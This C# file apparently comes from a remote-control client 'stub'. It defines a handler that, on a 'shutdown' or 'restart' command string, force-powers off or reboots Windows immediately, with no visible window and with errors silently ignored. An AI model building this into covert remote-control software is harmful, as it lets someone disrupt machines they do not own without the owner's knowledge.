using System.Diagnostics;

namespace stub
{
    internal class ShutdownHandler
    {
        public static void shutdown(string cmd)
        {
            try
            {
                if (cmd.Contains("shutdown"))
                {
                    var psi = new ProcessStartInfo("shutdown", "/s /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                }
                else if (cmd.Contains("restart"))
                {
                    var psi = new ProcessStartInfo("shutdown", "/r /t 0");
                    psi.CreateNoWindow = true;
                    psi.UseShellExecute = false;
                    Process.Start(psi);
                }
            }
            catch { }
        }
    }
}
